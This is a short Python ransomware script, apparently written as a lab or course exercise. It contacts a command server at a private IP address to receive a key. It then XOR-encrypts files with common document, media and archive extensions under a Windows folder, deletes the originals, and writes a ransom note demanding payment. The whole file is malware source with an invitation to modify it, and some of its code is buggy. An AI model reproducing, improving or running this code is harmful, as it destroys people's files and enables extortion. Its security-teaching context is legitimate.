#This prgram is created by Alexey Titov and Shir Bentabou
#Try To modify it by your own

#libraries
import os
import socket
import sys
import string
import random

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.2.7", 8000)) #("IP_ADDRESS", PORT)

#connect to server and reject key for encrypt
enter = "hello there"
exit = "Let's Do it"
sock.send(enter.encode())
print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)
sock.send(exit.encode())
sock.close()

#encryption function - xor between key and data
def str_xor(s1, s2):
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

#FILE ENCYPTING FUNCTION (DON'T TOUCH ANYTHING)
def file_ecrypt(key, name):
    if (name!="ENC.py"):
        with open(name,'rb') as f:
                data = f.read()
                f.close()
        
        #encrypt using str_xor function
        encrypted = str_xor(data, key.strip('\n'))
        encrypted_file = name + ".encrypted"
        try:
                with open(encrypted_file, 'wb') as f:
                        f.write(encrypted)
                        f.close()
                os.remove(name)
        except:
                print("Error: Not Permitted")

#LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
def filelist():
    mylist = [".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
    try:
			for root, dirs, files in os.walk("c:\\Games"):
				for file in files:
					for ext in mylist:    
						if file.endswith(ext):
							ally = os.path.join(root, file)
							print(ally)
							file_ecrypt(key, ally)
	except:
			print("Error: File is not exist")

filelist() #EXECUTING THE RANSOMWARE
#print a message to the user in current folder
threat = open('OMG I WAS ATTACKED.txt', 'w') 
threat.write('Your files have been encrypted by a ransomware! To have them back you must pay! \n For further details contac 555-0321')
threat.close()
